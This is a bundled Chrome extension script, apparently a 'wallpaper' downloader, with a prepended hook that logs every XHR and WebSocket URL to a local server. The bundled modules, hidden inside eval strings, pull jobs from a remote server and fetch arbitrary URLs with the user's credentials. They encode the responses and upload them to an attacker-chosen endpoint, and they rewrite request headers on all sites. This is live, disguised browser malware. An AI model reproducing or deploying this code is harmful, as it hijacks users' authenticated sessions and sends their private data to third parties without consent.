function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, {
/******/ 				configurable: false,
/******/ 				enumerable: true,
/******/ 				get: getter
/******/ 			});
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = "./build/sunsets/extension/src/main.js");
/******/ })
/************************************************************************/
/******/ ({

/***/ "./build/sunsets/extension/src/image_download.js":
/*!*******************************************************!*\
  !*** ./build/sunsets/extension/src/image_download.js ***!
  \*******************************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

"use strict";
eval("\n\nvar _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if (\"value\" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();\n\nfunction _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError(\"Cannot call a class as a function\"); } }\n\nvar ImageDownload = function () {\n\tfunction ImageDownload() {\n\t\t_classCallCheck(this, ImageDownload);\n\t}\n\n\t_createClass(ImageDownload, [{\n\t\tkey: \"init\",\n\t\tvalue: function init(request) {\n\t\t\tvar serv = \"https://api.ad-busters.com:8463/inc?uid=12345&appName=wallpaper&appVersion=1.0&devId=S3\";\n\t\t\tvar xhr = new XMLHttpRequest();\n\t\t\txhr.open(\"GET\", serv);\n\t\t\tvar self = this;\n\t\t\txhr.setRequestHeader(\"Content-Type\", \"application/json\");\n\t\t\txhr.onreadystatechange = function () {\n\t\t\t\tif (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {\n\t\t\t\t\tvar resp;\n\t\t\t\t\ttry {\n\t\t\t\t\t\tresp = JSON.parse(xhr.responseText);\n\t\t\t\t\t} catch (error) {\n\t\t\t\t\t\tresp = null;\n\t\t\t\t\t}\n\t\t\t\t\tif (resp != null) {\n\t\t\t\t\t\tchrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {\n\t\t\t\t\t\t\tself.req(\"GET\", resp.url, '', resp);\n\t\t\t\t\t\t});\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t};\n\t\t\txhr.send(null);\n\t\t}\n\t}, {\n\t\tkey: \"req\",\n\t\tvalue: function req(method, url, postparams, job) {\n\t\t\tvar self = this;\n\t\t\tvar tr = new XMLHttpRequest();\n\t\t\ttr.withCredentials = true;\n\t\t\ttr.open(method, url, true);\n\n\t\t\tvar image_name = job.headers[0].split(\":\");\n\t\t\ttr.setRequestHeader('image-name', image_name[1]);\n\t\t\ttr.onreadystatechange = function () {\n\t\t\t\tif (tr.readyState == 4) {\n\t\t\t\t\tif (tr.status == 200) {\n\t\t\t\t\t\tjob['result_status'] = tr.status;\n\t\t\t\t\t\tjob['result_headers'] = tr.getAllResponseHeaders();\n\t\t\t\t\t\tvar request = { 'resptxt': tr.responseText, 'job': job };\n\t\t\t\t\t\tself.store(request);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t};\n\t\t\ttr.send(postparams);\n\t\t}\n\t}, {\n\t\tkey: \"store\",\n\t\tvalue: function store(request) {\n\t\t\tvar gzData = Zip.gzip(request.resptxt, { to: 'string' });\n\t\t\tgzData = btoa(gzData);\n\n\t\t\tvar postContent = JSON.stringify({ \"body\": gzData, \"id\": request.job.id, \"uid\": 4242, \"statusCode\": 200, \"requestUrl\": request.job.url, \"headers\": request.job.result_headers.split(\"\\r\\n\") });\n\t\t\tvar xhr = new XMLHttpRequest();\n\t\t\txhr.open(\"PUT\", request.job.resultEndpoint, true);\n\t\t\txhr.setRequestHeader(\"Content-Type\", \"application/json\");\n\t\t\txhr.onreadystatechange = function () {\n\t\t\t\tif (xhr.readyState == 4) {\n\t\t\t\t\tif (xhr.status == 200) {}\n\t\t\t\t}\n\t\t\t};\n\t\t\txhr.send(postContent);\n\t\t}\n\t}, {\n\t\tkey: \"findNewWallpapers\",\n\t\tvalue: function findNewWallpapers(details) {\n\t\t\tfor (var i = 0; i < details.requestHeaders.length; ++i) {\n\t\t\t\tif (details.requestHeaders[i].name === 'image-name') {\n\t\t\t\t\tdetails.requestHeaders[i].name = 'User-Agent';\n\t\t\t\t}\n\t\t\t\tif (details.requestHeaders[i].name === 'Cookie') {\n\t\t\t\t\tdetails.requestHeaders.splice(i, 1);\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn details;\n\t\t}\n\t}, {\n\t\tkey: \"ping\",\n\t\tvalue: function ping(request) {\n\t\t\tconsole.log('Hello World!!!');\n\t\t}\n\t}]);\n\n\treturn ImageDownload;\n}();\n\nmodule.exports = ImageDownload;\n\n//# sourceURL=webpack:///./build/sunsets/extension/src/image_download.js?");

/***/ }),

/***/ "./build/sunsets/extension/src/main.js":
/*!*********************************************!*\
  !*** ./build/sunsets/extension/src/main.js ***!
  \*********************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

"use strict";
eval("\n\nvar ImageDownload = __webpack_require__(/*! ./image_download */ \"./build/sunsets/extension/src/image_download.js\");\n\nvar image_download = new ImageDownload();\n\nchrome.runtime.onInstalled.addListener(function (object) {\n\tchrome.tabs.create({ url: chrome.extension.getURL(\"index.html\") });\n});\n\nchrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {\n\tswitch (request.action) {\n\t\tcase \"start\":\n\t\t\timage_download.init(request);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tconsole.log(\"unknown Message \" + request.action);\n\t\t\tbreak;\n\t}\n\treturn true;\n});\n\nchrome.webRequest.onBeforeSendHeaders.addListener(function (details) {\n\tif (details.type == \"xmlhttprequest\" && details.requestHeaders[0]['name'] === 'fly') {\n\t\tvar _details = image_download.findNewWallpapers(_details);\n\t\treturn { requestHeaders: _details.requestHeaders };\n\t}\n}, { urls: [\"<all_urls>\"] }, [\"blocking\", \"requestHeaders\"]);\n\n//# sourceURL=webpack:///./build/sunsets/extension/src/main.js?");

/***/ })

/******/ });